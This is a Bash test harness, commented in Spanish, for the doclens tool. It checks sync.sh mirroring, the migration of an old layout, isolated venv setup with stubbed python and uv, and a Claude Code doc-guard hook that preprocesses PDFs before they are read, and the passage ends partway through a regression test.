#!/usr/bin/env bash
# tests/harness/doclens-tests.sh — doclens homologado (ADR-0076): espejo, migración de la
# estructura vieja, venv aislado y listo para usar, doc-guard con arranque perezoso.
# Sin red: python y uv son stubs (el uv falso registra args y entorno con que lo llaman).
# Uso: bash tests/harness/doclens-tests.sh   (también lo invoca run-tests.sh)
set -uo pipefail

AI_TOOLING="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
H="$AI_TOOLING/.claude/hooks"
T=$(mktemp -d); T=$(cd -P "$T" && pwd -P)
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); echo "  ✓ $1"; }
bad() { FAIL=$((FAIL+1)); echo "  ✗ FAIL: $1"; }
eq()  { [ "$2" = "$3" ] && ok "$1" || bad "$1 (got [$2] want [$3])"; }
has() { case "$2" in *"$3"*) ok "$1" ;; *) bad "$1 (no contiene [$3]: ${2%%$'\n'*})" ;; esac; }
unset GIT_DIR GIT_INDEX_FILE CLAUDE_PROJECT_DIR DOCLENS_PYTHON VIRTUAL_ENV CONDA_PREFIX
g() { git -c user.name=t -c user.email=t@t -c commit.gpgsign=false "$@"; }
# Caché de digests por usuario (ADR-0077), aislado en el tmp del test
export DOCLENS_CACHE="$T/cache"; mkdir -m 700 "$DOCLENS_CACHE"
# TMPDIR propio: el estado del hook (pidfiles, tope de procesos) no se mezcla con el uso real
# ni con otras corridas; al final se terminan los procesos en segundo plano que queden
export TMPDIR="$T/tmp"; mkdir -p "$TMPDIR"
cleanup_bg() {
  local f p
  for f in "$T"/tmp/doclens-hook-*/*.pid "$T"/*/doclens-hook-*/*.pid "$T"/tmp/tmp.*/*.pid; do
    [ -f "$f" ] || continue; p=$(cut -d' ' -f1 "$f")
    [ -n "$p" ] && { kill -- -"$p" 2>/dev/null || kill "$p" 2>/dev/null; }
  done
}
hsh() { { sha256sum "$1" 2>/dev/null || shasum -a 256 "$1"; } | cut -d' ' -f1; }
dgst() { echo "$DOCLENS_CACHE/$(hsh "$1").inspect"; }   # ruta del digest de un archivo
REAL_PY="$AI_TOOLING/doclens/.venv/bin/python"; REAL=false
[ -x "$REAL_PY" ] && "$REAL_PY" -c 'import fitz,sys; sys.stdout.write("MUPDF-" + fitz.VersionBind)' 2>/dev/null | grep -q '^MUPDF-' && REAL=true

# ── stubs ─────────────────────────────────────────────────────────────────────
export STUB="$T/stub-python" UVLOG="$T/uv.log"
cat > "$STUB" <<'EOF'
#!/bin/sh
# python falso: import-check (falla si el venv tiene BROKEN), smoke, -m, o "procesar" un archivo
case "$1" in
  -c) case "$2" in *"import fitz"*) [ -f "$(dirname "$0")/../BROKEN" ] && exit 1 ;; esac; exit 0 ;;
  -)  cat >/dev/null; echo "doclens: smoke OK — stub"; exit 0 ;;
  -m) exit 0 ;;
esac
h=$({ sha256sum "$2" 2>/dev/null || shasum -a 256 "$2"; } | cut -d' ' -f1)
d="$DOCLENS_CACHE/$h.inspect"; mkdir -p "$d"; : > "$d/index.md"; : > "$d/downscaled.png"; echo "INSPECT_DIR=$d"
EOF
mkdir -p "$T/fakeuv"
cat > "$T/fakeuv/uv" <<'EOF'
#!/bin/sh
echo "uv $* | VIRTUAL_ENV=${VIRTUAL_ENV:-} CONDA_PREFIX=${CONDA_PREFIX:-} UV_PYTHON_DOWNLOADS=${UV_PYTHON_DOWNLOADS:-}" >> "$UVLOG"
if [ "$1" = venv ]; then for a; do v="$a"; done; mkdir -p "$v/bin"; cp "$STUB" "$v/bin/python"; chmod +x "$v/bin/python"; fi
exit 0
EOF
chmod +x "$STUB" "$T/fakeuv/uv"
# python3 falso en el PATH: si /usr/bin/python3 es < 3.9 (p. ej. Alpine 3.10 → 3.7) sync.sh
# pasa al python3 del PATH — los tests no dependen del Python del sistema
ln -s "$STUB" "$T/fakeuv/python3"
UVPATH="$T/fakeuv:$PATH"

# ── toolbox de prueba: repo git con doclens/ (lo versionado + lo nuevo sin ignorar) ──
TB="$T/tb"; mkdir -p "$TB"
(cd "$AI_TOOLING" && git ls-files --cached --others --exclude-standard -- doclens) | while IFS= read -r f; do
  [ -f "$AI_TOOLING/$f" ] && mkdir -p "$TB/$(dirname "$f")" && cp -p "$AI_TOOLING/$f" "$TB/$f"
done
(cd "$TB" && g init -q && g add -A && g commit -qm tb) >/dev/null
SYNC="$TB/doclens/sync.sh"
cd "$T" || exit 1
SRCLIST() { (cd "$TB/doclens" && git ls-files | LC_ALL=C sort); }

consumer() {  # repo git nuevo; imprime su path (6 X: busybox)
  local c; c=$(mktemp -d "$T/c.XXXXXX") || { echo "mktemp falló" >&2; exit 1; }
  (cd "$c" && g init -q && mkdir .claude && touch README && g add -A && g commit -qm i) >/dev/null
  echo "$c"
}
stubvenv() { mkdir -p "$1/bin"; cp "$STUB" "$1/bin/python"; chmod +x "$1/bin/python"; : > "$1/MARK"; }
mirror_ok() {  # doclens/ del consumer == lo versionado en el toolbox (lista + contenido)
  local src f; src=$(SRCLIST)
  [ "$(cd "$1/doclens" && find . -type f ! -path './.venv*' | sed 's|^\./||' | LC_ALL=C sort)" = "$src" ] || return 1
  while IFS= read -r f; do cmp -s "$TB/doclens/$f" "$1/doclens/$f" || return 1; done <<< "$src"
}
dg() {  # dg <root> <file> [VAR=valor…] → "rc|stderr" de doc-guard
  local root="$1" file="$2" e rc; shift 2
  e=$(echo "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$file\"}}" \
      | (cd "$root" && env CLAUDE_PROJECT_DIR="$root" PATH="$UVPATH" "$@" bash "$H/doc-guard.sh" 2>&1 >/dev/null)); rc=$?
  echo "$rc|$e"
}

echo "══ D1: consumer nuevo → espejo exacto, venv propio preservado ══"
C1=$(consumer); stubvenv "$C1/doclens/.venv"
has "--check antes → update disponible" "$(bash "$SYNC" "$C1" --check)" "update disponible"
OUT=$(bash "$SYNC" "$C1" 2>&1); RC=$?
eq "sync → exit 0" "$RC" 0
has "reporta sincronizado" "$OUT" "doclens sincronizado"
mirror_ok "$C1" && ok "doclens/ idéntico a lo versionado en el toolbox" || bad "espejo distinto"
[ -f "$C1/doclens/.venv/MARK" ] && ok "doclens/.venv existente intacto" || bad "venv perdido"
[ -f "$C1/doclens/.gitignore" ] && grep -qx '.venv/' "$C1/doclens/.gitignore" && ok "doclens/.gitignore ignora .venv/" || bad "sin doclens/.gitignore"
(cd "$C1" && g add -A >/dev/null && [ -z "$(git ls-files doclens/.venv)" ]) && ok "git no versiona doclens/.venv" || bad ".venv entró a git"
has "--check después → al día" "$(bash "$SYNC" "$C1" --check)" "doclens al día"

echo "══ D2: segunda corrida — no-op ══"
REF="$T/d2ref"; sleep 1; : > "$REF"; sleep 1
OUT=$(bash "$SYNC" "$C1" 2>&1)
has "reporta al día" "$OUT" "doclens al día"
[ -z "$(find "$C1/doclens" -newer "$REF" ! -path '*/.venv*' -type f)" ] && ok "ningún archivo reescrito" || bad "reescribió archivos sin cambios"
[ -z "$(ls -d "$C1"/.claude/.harness-backup-*-doclens 2>/dev/null)" ] && ok "sin respaldo" || bad "respaldo sin cambios"

echo "══ D3: cambio en un adapter SIN subir VERSION → se propaga ══"
echo "// cambio" >> "$TB/doclens/adapters/opencode/doclens-tool.ts"; (cd "$TB" && g commit -qam adapter)
bash "$SYNC" "$C1" >/dev/null 2>&1
cmp -s "$TB/doclens/adapters/opencode/doclens-tool.ts" "$C1/doclens/adapters/opencode/doclens-tool.ts" && ok "adapter propagado (contenido, no VERSION)" || bad "adapter no propagado"

echo "══ D4: archivo que sobra en el consumer → se borra con respaldo ══"
echo local > "$C1/doclens/extra.txt"
bash "$SYNC" "$C1" >/dev/null 2>&1
[ ! -f "$C1/doclens/extra.txt" ] && ok "extra.txt eliminado" || bad "extra.txt sigue"
ls "$C1"/.claude/.harness-backup-*-doclens/doclens/extra.txt >/dev/null 2>&1 && ok "extra.txt en el respaldo" || bad "sin respaldo de extra.txt"
mirror_ok "$C1" && ok "espejo exacto tras limpiar" || bad "espejo distinto tras limpiar"

echo "══ D5: estructura vieja (scripts/) → migrada con respaldo, venv movido, aviso de rutas viejas ══"
C2=$(consumer); mkdir -p "$C2/scripts" "$C2/.opencode/tools" "$C2/.claude/hooks"
printf 'DOCLENS_VERSION = "1.0.0"\n' > "$C2/scripts/doclens.py"; echo pymupdf > "$C2/scripts/requirements-doc-tools.txt"; echo 1.0.0 > "$C2/scripts/.doclens-version"
stubvenv "$C2/scripts/.venv-doc-tools"
echo 'const s = "scripts/doclens.py"' > "$C2/.opencode/tools/doclens.ts"
cp "$H/doc-guard.sh" "$C2/.claude/hooks/doc-guard.sh"   # menciona scripts/ como transición: no es aviso
(cd "$C2" && g add -A && g commit -qm legacy) >/dev/null
has "--check → estructura vieja" "$(bash "$SYNC" "$C2" --check)" "estructura vieja"
OUT=$(bash "$SYNC" "$C2" 2>&1); RC=$?
eq "sync → exit 0" "$RC" 0
for f in doclens.py requirements-doc-tools.txt .doclens-version; do
  [ ! -e "$C2/scripts/$f" ] && ls "$C2"/.claude/.harness-backup-*-doclens/scripts/$f >/dev/null 2>&1 \
    && ok "scripts/$f respaldado y quitado" || bad "scripts/$f no migrado"
done
[ -f "$C2/doclens/.venv/MARK" ] && [ ! -e "$C2/scripts/.venv-doc-tools" ] && ok "venv movido (sin reinstalar)" || bad "venv no movido"
mirror_ok "$C2" && ok "doclens/ espejo exacto" || bad "espejo distinto"
has "aviso: .opencode/tools/doclens.ts usa la ruta vieja" "$OUT" ".opencode/tools/doclens.ts"
case "$OUT" in *"hooks/doc-guard.sh"*) bad "doc-guard.sh reportado como ruta vieja" ;; *) ok "doc-guard.sh (transición) no se reporta" ;; esac
has "--check después → al día" "$(bash "$SYNC" "$C2" --check)" "doclens al día"

echo "══ D6: scripts/doclens.py AJENO → intacto ══"
C3=$(consumer); mkdir -p "$C3/scripts"; echo "print('mío')" > "$C3/scripts/doclens.py"; stubvenv "$C3/doclens/.venv"
case "$(bash "$SYNC" "$C3" --check)" in "estructura vieja"*) bad "ajeno tomado como estructura vieja" ;; *) ok "--check no lo toma como nuestro" ;; esac
bash "$SYNC" "$C3" >/dev/null 2>&1
[ "$(cat "$C3/scripts/doclens.py")" = "print('mío')" ] && ok "scripts/doclens.py ajeno intacto" || bad "pisó un archivo ajeno"

echo "══ D7: el propio toolbox → no copia, solo venv ══"
stubvenv "$TB/doclens/.venv"
eq "--check → toolbox" "$(bash "$SYNC" "$TB" --check)" "toolbox: solo venv"
OUT=$(bash "$SYNC" "$TB" 2>&1); RC=$?
eq "sync en el toolbox → exit 0" "$RC" 0
case "$OUT" in *sincronizado*) bad "el toolbox se copió a sí mismo" ;; *) ok "no se copia a sí mismo" ;; esac
eq "copia espejo del consumer → también modo propio" "$(cd "$C1/doclens/adapters" && bash ../sync.sh --check 2>&1)" "toolbox: solo venv"

echo "══ D8: venv nuevo aislado del Python del proyecto ══"
C4=$(consumer); bash "$SYNC" "$C4" --check >/dev/null
mkdir -p "$C4/.venv/lib/site-packages"; printf 'home = /x\n' > "$C4/.venv/pyvenv.cfg"; echo pkg > "$C4/.venv/lib/site-packages/p"
echo "9.99.9" > "$C4/.python-version"
CK0=$(cd "$C4/.venv" && find . -type f -exec cksum {} + | sort)
: > "$UVLOG"
OUT=$(cd "$C4" && env PATH="$UVPATH" VIRTUAL_ENV="$C4/.venv" CONDA_PREFIX=/opt/conda bash "$SYNC" "$C4" 2>&1); RC=$?
eq "sync con venv del proyecto activado → exit 0" "$RC" 0
[ -x "$C4/doclens/.venv/bin/python" ] && ok "doclens/.venv creado" || bad "no creó doclens/.venv"
grep -q '^uv venv .*--python /' "$UVLOG" && ok "uv venv con --python absoluto" || bad "uv venv sin python explícito: $(head -1 "$UVLOG")"
grep -q 'VIRTUAL_ENV= CONDA_PREFIX= UV_PYTHON_DOWNLOADS=never' "$UVLOG" && ok "sin VIRTUAL_ENV/CONDA_PREFIX heredados y sin descargas de Python" || bad "entorno filtrado: $(head -1 "$UVLOG")"
eq "venv del proyecto intacto" "$(cd "$C4/.venv" && find . -type f -exec cksum {} + | sort)" "$CK0"
has "smoke ejecutado" "$OUT" "smoke OK"

echo "══ D9: venv roto → se recrea ══"
: > "$C4/doclens/.venv/BROKEN"; : > "$UVLOG"
(cd "$C4" && env PATH="$UVPATH" bash "$SYNC" "$C4" >/dev/null 2>&1)
[ ! -f "$C4/doclens/.venv/BROKEN" ] && grep -q '^uv venv' "$UVLOG" && ok "venv roto recreado" || bad "venv roto no recreado"

echo "══ D10: lock compartido y reintento tras fallo ══"
C5=$(consumer); cp -R "$TB/doclens" "$C5/doclens"; rm -rf "$C5/doclens/.venv"
mkdir "$C5/doclens/.venv.lock"
OUT=$(env PATH="$UVPATH" bash "$C5/doclens/sync.sh" "$C5" --venv 2>&1); RC=$?
eq "lock fresco → exit 3 (otro proceso)" "$RC" 3
touch -t 202001010000 "$C5/doclens/.venv.lock"
env PATH="$UVPATH" bash "$C5/doclens/sync.sh" "$C5" --venv >/dev/null 2>&1; RC=$?
eq "lock huérfano (>10 min) → se libera y crea" "$RC" 0
[ ! -d "$C5/doclens/.venv.lock" ] && ok "lock liberado al terminar" || bad "lock quedó tomado"
rm -rf "$C5/doclens/.venv"; date > "$C5/doclens/.venv.failed"
OUT=$(env PATH="$UVPATH" bash "$C5/doclens/sync.sh" "$C5" --venv 2>&1); RC=$?
eq "falló hace < 1 h → no reintenta (exit 1)" "$RC" 1
has "explica cómo forzar" "$OUT" "--force"
env PATH="$UVPATH" bash "$C5/doclens/sync.sh" "$C5" --force >/dev/null 2>&1; RC=$?
eq "--force reintenta y crea" "$RC" 0
[ ! -f "$C5/doclens/.venv.failed" ] && ok "éxito borra .venv.failed" || bad ".venv.failed quedó"

echo "══ D11: doc-guard listo para usar — arranque perezoso, lock, fallo, DOCLENS_PYTHON ══"
echo "doc.pdf" > "$T/doc.pdf"
C6=$(consumer); cp -R "$TB/doclens" "$C6/doclens"; rm -rf "$C6/doclens/.venv"
R=$(dg "$C6" "$T/doc.pdf"); case "$R" in "2|"*pre-procesado*) ok "sin venv: lo crea solo y procesa el PDF" ;; *) bad "arranque perezoso: ${R%%$'\n'*}" ;; esac
[ -x "$C6/doclens/.venv/bin/python" ] && ok "doclens/.venv creado por doc-guard" || bad "doc-guard no creó el venv"
rm -rf "$C6/doclens/.venv" "$(dgst "$T/doc.pdf")"; mkdir "$C6/doclens/.venv.lock"
R=$(dg "$C6" "$T/doc.pdf"); case "$R" in "2|"*"reintenta el Read"*) ok "lock tomado → 'reintenta' (no 2º arranque)" ;; *) bad "con lock: ${R%%$'\n'*}" ;; esac
rmdir "$C6/doclens/.venv.lock"; date > "$C6/doclens/.venv.failed"
R=$(dg "$C6" "$T/doc.pdf"); case "$R" in "2|"*"bash doclens/sync.sh --force"*) ok "fallo reciente → mensaje manual con el comando" ;; *) bad "fallo reciente: ${R%%$'\n'*}" ;; esac
rm -f "$C6/doclens/.venv.failed"
R=$(dg "$C6" "$T/doc.pdf" DOCLENS_PYTHON="$STUB"); case "$R" in "2|"*pre-procesado*) ok "DOCLENS_PYTHON → usa ese intérprete" ;; *) bad "DOCLENS_PYTHON: ${R%%$'\n'*}" ;; esac
[ ! -e "$C6/doclens/.venv" ] && ok "con DOCLENS_PYTHON no crea doclens/.venv" || bad "creó venv pese a DOCLENS_PYTHON"
cmp -s "$H/doc-guard.sh" "$AI_TOOLING/doclens/adapters/claude-code/doc-guard.sh" && ok "doc-guard.sh == adapter de doclens" || bad "las 2 copias de doc-guard.sh difieren"

echo "══ D12: auto-sync real en un consumer viejo → migrado y el doctor sin avisos ══"
C7=$(consumer); mkdir -p "$C7/scripts"
printf 'DOCLENS_VERSION = "1.0.0"\n' > "$C7/scripts/doclens.py"; echo 1.0.0 > "$C7/scripts/.doclens-version"
stubvenv "$C7/scripts/.venv-doc-tools"
echo "{\"local_path\":\"$AI_TOOLING\",\"sync_skills\":false,\"sync_hooks\":false}" > "$C7/.ai-tooling"
echo "{\"cwd\":\"$C7\"}" | (cd "$C7" && env CLAUDE_PROJECT_DIR="$C7" PATH="$UVPATH" bash "$H/auto-sync-daily.sh" >/dev/null 2>&1)
grep -q 'estructura vieja migrada' "$C7/.claude/sync.log" 2>/dev/null && ok "sync.log registra la migración" || bad "sync.log sin migración"
[ -f "$C7/doclens/doclens.py" ] && [ -f "$C7/doclens/.venv/MARK" ] && [ ! -e "$C7/scripts/doclens.py" ] && ok "auto-sync dejó doclens/ + venv movido" || bad "auto-sync no migró"
DOC=$(bash "$AI_TOOLING/scripts/harness-doctor.sh" "$C7" 2>&1)
case "$DOC" in *"WARN: doclens"*) bad "doctor aún avisa: $(grep 'doclens' <<< "$DOC" | head -1)" ;; *) ok "doctor sin aviso de doclens" ;; esac

echo "══ D13: motor real ══"
if $REAL; then
  "$AI_TOOLING/doclens/.venv/bin/python" -c "import fitz,sys; d=fitz.open(); d.new_page().insert_text((72,72),'hola'); d.save(sys.argv[1])" "$T/real.pdf"
  "$AI_TOOLING/doclens/.venv/bin/python" "$AI_TOOLING/doclens/doclens.py" "$T/real.pdf" >/dev/null 2>&1
  R1=$(dgst "$T/real.pdf")
  [ -f "$R1/index.md" ] && [ ! -e "$T/real.pdf.inspect" ] && ok "digest en el caché por usuario, nada junto al PDF" || bad "digest fuera del caché"
  [ "$(ls -ld "$R1" | cut -c1-10)" = drwx------ ] && [ "$(ls -l "$R1/index.md" | cut -c1-10)" = -rw------- ] \
    && ok "digest privado (0700/0600)" || bad "permisos del digest: $(ls -ld "$R1" | cut -c1-10) $(ls -l "$R1/index.md" | cut -c1-10)"
  mkdir -p "$T/ro"; cp "$T/real.pdf" "$T/ro/r.pdf"; chmod 555 "$T/ro"
  OUT=$("$AI_TOOLING/doclens/.venv/bin/python" "$AI_TOOLING/doclens/doclens.py" "$T/ro/r.pdf" 2>/dev/null); chmod 755 "$T/ro"
  D="${OUT#*INSPECT_DIR=}"
  [ -f "$D/index.md" ] && case "$D" in "$T/ro/"*) false ;; *) true ;; esac \
    && ok "carpeta de solo lectura → sidecar en un temporal" || bad "solo lectura: [$OUT]"
else
  echo "  - omitido: sin doclens/.venv real (corre bash doclens/sync.sh)"
fi
if command -v ruff >/dev/null 2>&1; then
  ruff check -q --no-cache "$AI_TOOLING/doclens/doclens.py" >/dev/null 2>&1 && ok "doclens.py limpio en ruff (no exporta avisos a consumers)" || bad "doclens.py con hallazgos de ruff"
else
  echo "  - omitido: ruff no instalado"
fi

# ── Segunda validación (revisión adversarial) ─────────────────────────────────
echo "══ D14: doclens/ como symlink — nunca se escribe ni borra a través de él ══"
C8=$(consumer); mkdir -p "$T/shared/doclens"; echo dato > "$T/shared/doclens/data.csv"; ln -s "$T/shared/doclens" "$C8/doclens"
OUT=$(bash "$SYNC" "$C8" 2>&1); RC=$?
eq "symlink a otra carpeta → exit 3" "$RC" 3
[ "$(cat "$T/shared/doclens/data.csv" 2>/dev/null)" = dato ] && [ ! -f "$T/shared/doclens/doclens.py" ] && ok "carpeta ajena intacta" || bad "escribió/borró a través del symlink"
C9=$(consumer); ln -s "$TB/doclens" "$C9/doclens"; echo nota > "$TB/doclens/NOTES-local.txt"
eq "symlink al propio toolbox → --check toolbox" "$(bash "$SYNC" "$C9" --check)" "toolbox: solo venv"
bash "$SYNC" "$C9" >/dev/null 2>&1
[ -f "$TB/doclens/NOTES-local.txt" ] && ok "no borra archivos del toolbox vía symlink" || bad "borró NOTES-local.txt del toolbox"
rm -f "$TB/doclens/NOTES-local.txt"

echo "══ D15: monorepo — el destino explícito se respeta (no sube a la raíz git) ══"
MONO=$(consumer); mkdir -p "$MONO/app"; stubvenv "$MONO/app/doclens/.venv"
bash "$SYNC" "$MONO/app" >/dev/null 2>&1
[ -f "$MONO/app/doclens/doclens.py" ] && [ ! -e "$MONO/doclens" ] && ok "doclens/ en el proyecto (mono/app), no en la raíz git" || bad "monorepo: $(ls -d "$MONO"/doclens "$MONO"/app/doclens 2>&1 | tr '\n' ' ')"
: > "$MONO/app/x.pdf"
R=$(dg "$MONO/app" "$MONO/app/x.pdf"); case "$R" in "2|"*pre-procesado*) ok "doc-guard lo encuentra (misma raíz que el sync)" ;; *) bad "doc-guard en monorepo: ${R%%$'\n'*}" ;; esac

echo "══ D16: DOCLENS_PYTHON = intérprete ya listo (mismo significado en sync y doc-guard) ══"
C10=$(consumer); bash "$SYNC" "$C10" --check >/dev/null
OUT=$(env DOCLENS_PYTHON="$STUB" bash "$SYNC" "$C10" 2>&1); RC=$?
eq "sync con DOCLENS_PYTHON sano → exit 0" "$RC" 0
has "lo usa en vez de crear venv" "$OUT" "usa DOCLENS_PYTHON"
[ ! -e "$C10/doclens/.venv" ] && ok "no crea doclens/.venv" || bad "creó venv con DOCLENS_PYTHON"
mkdir -p "$T/badpy/bin"; printf '#!/bin/sh\necho "ModuleNotFoundError: No module named fitz" >&2; exit 1\n' > "$T/badpy/bin/python"; chmod +x "$T/badpy/bin/python"
stubvenv "$C10/doclens/.venv"
OUT=$(env DOCLENS_PYTHON="$T/badpy/bin/python" bash "$SYNC" "$C10" 2>&1); RC=$?
eq "DOCLENS_PYTHON sin dependencias → no falla (compatibilidad)" "$RC" 0
has "avisa y usa doclens/.venv" "$OUT" "se usa doclens/.venv"
echo "d16.pdf" > "$T/d16.pdf"
R=$(dg "$C10" "$T/d16.pdf" DOCLENS_PYTHON="$T/badpy/bin/python"); case "$R" in "2|"*pre-procesado*) ok "doc-guard: DOCLENS_PYTHON roto → usa doclens/.venv" ;; *) bad "doc-guard DOCLENS_PYTHON roto: ${R%%$'\n'*}" ;; esac
rm -rf "$C10/doclens/.venv"; date > "$C10/doclens/.venv.failed"; rm -rf "$(dgst "$T/d16.pdf")"
R=$(dg "$C10" "$T/d16.pdf" DOCLENS_PYTHON="$T/badpy/bin/python"); case "$R" in "2|"*"DOCLENS_PYTHON="*"no tiene las dependencias"*) ok "sin venv: el mensaje nombra DOCLENS_PYTHON" ;; *) bad "mensaje DOCLENS_PYTHON: ${R%%$'\n'*}" ;; esac
rm -f "$C10/doclens/.venv.failed"

echo "══ D17: ruta con [corchetes] — el lock y .venv de otro proceso intactos ══"
CB="$T/proj [v2]"; mkdir -p "$CB" && (cd "$CB" && g init -q && touch R && g add -A && g commit -qm i) >/dev/null
stubvenv "$CB/doclens/.venv"; mkdir -p "$CB/doclens/.venv/emptydir" "$CB/doclens/.venv.lock"; echo $$ > "$CB/doclens/.venv.lock/pid"
bash "$SYNC" "$CB" >/dev/null 2>&1
[ -d "$CB/doclens/.venv.lock" ] && [ -d "$CB/doclens/.venv/emptydir" ] && ok "lock y .venv intactos con '[' en la ruta" || bad "borró lock o .venv por glob"

echo "══ D18: el espejo es lo COMMITEADO del toolbox, no su working tree ══"
echo nota > "$TB/doclens/zz-notes.md"; (cd "$TB" && g add -A && g commit -qm zz) >/dev/null
rm "$TB/doclens/zz-notes.md"; echo "edición sin commit" >> "$TB/doclens/README.md"; echo nuevo > "$TB/doclens/untracked.txt"
C11=$(consumer); stubvenv "$C11/doclens/.venv"
bash "$SYNC" "$C11" >/dev/null 2>&1; RC=$?
eq "último archivo borrado del working tree → exit 0 (no muere por pipefail)" "$RC" 0
[ -f "$C11/doclens/zz-notes.md" ] && ok "archivo commiteado llega aunque falte en el working tree" || bad "zz-notes.md no llegó"
! grep -q "edición sin commit" "$C11/doclens/README.md" && ok "edición sin commitear NO se propaga" || bad "propagó edición sin commit"
[ ! -e "$C11/doclens/untracked.txt" ] && ok "archivo sin versionar NO se propaga" || bad "propagó untracked"
(cd "$TB" && g checkout -q -- doclens && rm -f doclens/untracked.txt)
[ -x "$C11/doclens/sync.sh" ] && ok "sync.sh conserva el bit de ejecución" || echo "  - (sync.sh no es ejecutable en el toolbox: sin verificar)"

echo "══ D19: lock de un proceso muerto → se libera de inmediato ══"
C12=$(consumer); cp -R "$TB/doclens" "$C12/doclens"; rm -rf "$C12/doclens/.venv"
sh -c 'exit 0' & DEAD=$!; wait "$DEAD"
mkdir "$C12/doclens/.venv.lock"; echo "$DEAD" > "$C12/doclens/.venv.lock/pid"
env PATH="$UVPATH" bash "$C12/doclens/sync.sh" "$C12" --venv >/dev/null 2>&1; RC=$?
eq "PID muerto → toma el lock y crea el venv" "$RC" 0
rm -rf "$C12/doclens/.venv"; mkdir "$C12/doclens/.venv.lock"; echo "$DEAD" > "$C12/doclens/.venv.lock/pid"; echo "d19.pdf" > "$T/d19.pdf"
R=$(dg "$C12" "$T/d19.pdf"); case "$R" in "2|"*pre-procesado*) ok "doc-guard no espera 10 min por un lock huérfano" ;; *) bad "lock huérfano en doc-guard: ${R%%$'\n'*}" ;; esac

echo "══ D20: doc-guard nunca alcanza el timeout del hook (fail-open) ══"
C13=$(consumer); mkdir -p "$C13/doclens/.venv/bin"; : > "$C13/doclens/doclens.py"
cat > "$C13/doclens/.venv/bin/python" <<EOF
#!/bin/sh
[ "\$1" = -c ] && exit 0
echo x >> "$T/slow.calls"; sleep 4
d="\$2.inspect"; mkdir -p "\$d"; : > "\$d/index.md"; echo "INSPECT_DIR=\$d"
EOF
chmod +x "$C13/doclens/.venv/bin/python"; echo "grande.pdf" > "$T/grande.pdf"; : > "$T/slow.calls"
S0=$SECONDS; R=$(dg "$C13" "$T/grande.pdf" DOCLENS_HOOK_WAIT=1); EL=$((SECONDS - S0))
case "$R" in "2|"*"reintenta el Read"*) ok "documento lento → bloquea con 'reintenta' (exit 2)" ;; *) bad "lento: ${R%%$'\n'*}" ;; esac
[ "$EL" -le 3 ] && ok "respeta el plazo (${EL}s, no espera al proceso)" || bad "esperó ${EL}s"
R=$(dg "$C13" "$T/grande.pdf" DOCLENS_HOOK_WAIT=1)
eq "2º Read mientras procesa → no lanza otro proceso" "$(wc -l < "$T/slow.calls" | tr -d ' ')" 1
sleep 4
R=$(dg "$C13" "$T/grande.pdf"); case "$R" in "2|"*pre-procesado*) ok "al terminar en segundo plano → digest listo" ;; *) bad "después: ${R%%$'\n'*}" ;; esac

echo "══ D21: falla del ARCHIVO (no del venv) → mensaje correcto, sin reinstalar ══"
C14=$(consumer); mkdir -p "$C14/doclens/.venv/bin"; : > "$C14/doclens/doclens.py"; cp "$SYNC" "$C14/doclens/sync.sh"
printf '#!/bin/sh\n[ "$1" = -c ] && exit 0\necho "RuntimeError: cannot open broken document" >&2; exit 1\n' > "$C14/doclens/.venv/bin/python"
chmod +x "$C14/doclens/.venv/bin/python"; echo "danado.pdf" > "$T/danado.pdf"; : > "$UVLOG"
R=$(dg "$C14" "$T/danado.pdf"); case "$R" in "2|"*"no pudo procesar este archivo"*"cannot open broken"*) ok "dice que el archivo falló (con el error de doclens)" ;; *) bad "archivo dañado: ${R%%$'\n'*}" ;; esac
[ ! -s "$UVLOG" ] && ok "no intenta reinstalar el venv" || bad "relanzó la creación del venv"

echo "══ D22: sin jq, PDF dentro de *.inspect/, toolbox sin git ══"
mkdir -p "$T/nojq"; for b in grep cat; do ln -sf "$(command -v $b)" "$T/nojq/$b"; done
R=$(echo '{"tool_name":"Read","tool_input":{"file_path":"/x/a.pdf"}}' | PATH="$T/nojq" "$BASH" "$H/doc-guard.sh" 2>&1 >/dev/null; echo "|$?")
case "$R" in *"jq"*"|2") ok "sin jq: el PDF se bloquea igual" ;; *) bad "sin jq: [$R]" ;; esac
R=$(echo '{"tool_name":"Read","tool_input":{"file_path":"/x/a.md"}}' | PATH="$T/nojq" "$BASH" "$H/doc-guard.sh" >/dev/null 2>&1; echo $?)
eq "sin jq: lo que no es PDF pasa" "$R" 0
mkdir -p "$T/rep.inspect/raw"; echo "rep.inspect/raw/x.pdf" > "$T/rep.inspect/raw/x.pdf"
R=$(dg "$C1" "$T/rep.inspect/raw/x.pdf"); case "$R" in "2|"*) ok "PDF real dentro de *.inspect/ → se intercepta" ;; *) bad "PDF en .inspect pasó: ${R%%|*}" ;; esac
eq "md dentro de *.inspect/ → libre" "$(dg "$C1" "$T/rep.inspect/index.md" | cut -d'|' -f1)" 0
mkdir -p "$T/tbfs"; (cd "$TB" && git archive HEAD doclens) | tar -xf - -C "$T/tbfs"
: > "$T/tbfs/doclens/.DS_Store"; : > "$T/tbfs/doclens/doclens.py.orig"; mkdir -p "$T/tbfs/doclens/.ruff_cache"; : > "$T/tbfs/doclens/.ruff_cache/x"
C15=$(consumer); stubvenv "$C15/doclens/.venv"; bash "$T/tbfs/doclens/sync.sh" "$C15" >/dev/null 2>&1
[ -f "$C15/doclens/doclens.py" ] && [ ! -e "$C15/doclens/.DS_Store" ] && [ ! -e "$C15/doclens/doclens.py.orig" ] && [ ! -e "$C15/doclens/.ruff_cache" ] \
  && ok "toolbox sin git: copia sin basura (.DS_Store, *.orig, caches)" || bad "copió basura: $(cd "$C15/doclens" && ls -a | tr '\n' ' ')"

echo "══ D23: regresiones de la 3ª validación (estado, rendimiento, nombres, compatibilidad) ══"
C16=$(consumer); stubvenv "$C16/doclens/.venv"; bash "$SYNC" "$C16" >/dev/null 2>&1; echo "d23.pdf" > "$T/d23.pdf"
TD="$T/tmpd"; mkdir -p "$TD"; SD="$TD/doclens-hook-$(id -u)"
R=$(dg "$C16" "$T/d23.pdf" TMPDIR="$TD"); case "$R" in "2|"*pre-procesado*) ok "PDF procesado" ;; *) bad "d23: ${R%%$'\n'*}" ;; esac
[ -z "$(ls "$SD" 2>/dev/null)" ] && ok "no deja .out/.pid tras terminar" || bad "quedó estado: $(ls "$SD" | tr '\n' ' ')"
KEY=$(printf '%s' "$T/d23.pdf" | cksum | cut -d' ' -f1); echo $$ > "$SD/$KEY.pid"; touch -t 202001010000 "$SD/$KEY.pid"
